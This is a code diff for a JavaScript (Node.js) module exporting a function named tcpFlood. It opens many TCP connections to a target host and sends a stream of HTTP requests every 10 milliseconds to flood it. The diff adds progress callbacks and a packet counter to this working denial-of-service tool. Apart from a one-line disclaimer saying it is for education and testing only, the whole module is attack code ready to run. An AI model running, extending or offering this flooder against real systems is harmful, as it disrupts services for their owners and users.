@@ -1,17 +1,19 @@
 import net from 'net';
 
 /**
- * Performs a TCP flood attack on a target.  This function is intended for educational/testing purposes ONLY.
+ * Performs a TCP flood attack on a target. This function is intended for educational/testing purposes ONLY.
  * Using this function against systems without explicit permission is illegal and unethical.
  *
  * @param {string} target The target hostname or IP address.
  * @param {number} port The target port. Defaults to 80.
  * @param {number} threads The number of concurrent TCP connections to establish. Defaults to 10.
  * @param {number} duration The duration of the flood in seconds. Defaults to 60.
+ * @param {function} statusCallback A callback function to update the status.
  */
-async function tcpFlood(target, port = 80, threads = 10, duration = 60) {
+async function tcpFlood(target, port = 80, threads = 10, duration = 60, statusCallback = null) {
   if (!target) {
     console.error("Target hostname or IP address is required for TCP flood.");
+    if (statusCallback) statusCallback({ status: 'error', message: 'Target is required.' });
     return;
   }
 
@@ -31,21 +33,22 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60) {
   }
 
   console.log(`Starting TCP flood attack on ${target}:${port} with ${threads} threads for ${duration} seconds.`);
+  if (statusCallback) statusCallback({ status: 'starting', message: `Starting TCP flood on ${target}:${port}` });
 
   const sockets = [];
   let startTime = Date.now();
-  let floodActive = true; // Flag to control the flood
+  let floodActive = true;
+  let packetsSent = 0;
 
-  function removeSocket(socket, sockets) {
+  function removeSocket(socket) {
     const index = sockets.indexOf(socket);
     if (index > -1) {
       sockets.splice(index, 1);
     }
   }
 
-
   for (let i = 0; i < threads; i++) {
-    if (!floodActive) break; // Stop creating threads if flood is stopped
+    if (!floodActive) break;
 
     try {
       const socket = net.createConnection({ host: target, port: port }, () => {
@@ -54,15 +57,9 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60) {
           return;
         }
         console.log(`Thread ${i + 1}: Connected to ${target}:${port}`);
+        if (statusCallback) statusCallback({ status: 'thread_connected', thread: i + 1 });
 
         sockets.push(socket);
-
-        // Send junk data continuously
-        socket.write("GET / HTTP/1.1\r\n"); // Basic HTTP request to keep connection alive.  Can be modified.
-        socket.write("Host: " + target + "\r\n");
-        socket.write("Connection: keep-alive\r\n");
-        socket.write("User-Agent: TCPFloodBot\r\n");
-        socket.write("\r\n");
 
         const intervalId = setInterval(() => {
           if (!floodActive) {
@@ -72,21 +69,29 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60) {
           }
 
           try {
-            //Keep alive
-            socket.write("X-Filler: " + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + "\r\n");
+            const payload = "GET / HTTP/1.1\r\n" +
+              "Host: " + target + "\r\n" +
+              "Connection: keep-alive\r\n" +
+              "User-Agent: TCPFloodBot\r\n" +
+              "X-Filler: " + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + "\r\n" +
+              "\r\n";
+            socket.write(payload);
+            packetsSent++;
+            if (statusCallback) statusCallback({ status: 'packet_sent', packets: packetsSent });
+
           } catch (err) {
             console.error(`Thread ${i + 1}: Error sending data: ${err.message}`);
+            if (statusCallback) statusCallback({ status: 'thread_error', thread: i + 1, error: err.message });
             clearInterval(intervalId);
             try {
               socket.destroy();
             } catch (e) {
               console.error(`Thread ${i + 1}: Error destroying socket: ${e.message}`);
             }
-            removeSocket(socket, sockets);
+            removeSocket(socket);
           }
         }, 10);
 
-        // Close the socket after the specified duration
         setTimeout(() => {
           console.log(`Thread ${i + 1}: Closing connection after ${duration} seconds.`);
           clearInterval(intervalId);
@@ -95,35 +100,37 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60) {
           } catch (e) {
             console.error(`Thread ${i + 1}: Error destroying socket: ${e.message}`);
           }
-          removeSocket(socket, sockets);
+          removeSocket(socket);
+          if (statusCallback) statusCallback({ status: 'thread_closed', thread: i + 1 });
         }, duration * 1000);
       });
 
-
       socket.on('error', (err) => {
         console.error(`Thread ${i + 1}: Socket error: ${err.message}`);
+        if (statusCallback) statusCallback({ status: 'socket_error', thread: i + 1, error: err.message });
         try {
           socket.destroy();
         } catch (e) {
           console.error(`Thread ${i + 1}: Error destroying socket: ${e.message}`);
         }
-        removeSocket(socket, sockets);
+        removeSocket(socket);
       });
 
       socket.on('close', () => {
         console.log(`Thread ${i + 1}: Connection closed.`);
-        removeSocket(socket, sockets);
+        removeSocket(socket);
+        if (statusCallback) statusCallback({ status: 'connection_closed', thread: i + 1 });
       });
 
     } catch (socketError) {
       console.error(`Error creating socket for thread ${i + 1}:`, socketError);
+      if (statusCallback) statusCallback({ status: 'socket_creation_error', thread: i + 1, error: socketError.message });
     }
   }
 
-  // Stop the flood after the specified duration
   setTimeout(() => {
     console.log("Stopping TCP flood.");
-    floodActive = false; // Signal to stop the flood
+    floodActive = false;
     sockets.forEach(socket => {
       try {
         socket.destroy();
@@ -131,8 +138,8 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60) {
         console.error("Error destroying socket:", e);
       }
     });
+    if (statusCallback) statusCallback({ status: 'flood_stopped', packets: packetsSent });
   }, duration * 1000);
-
 }
 
 export { tcpFlood };
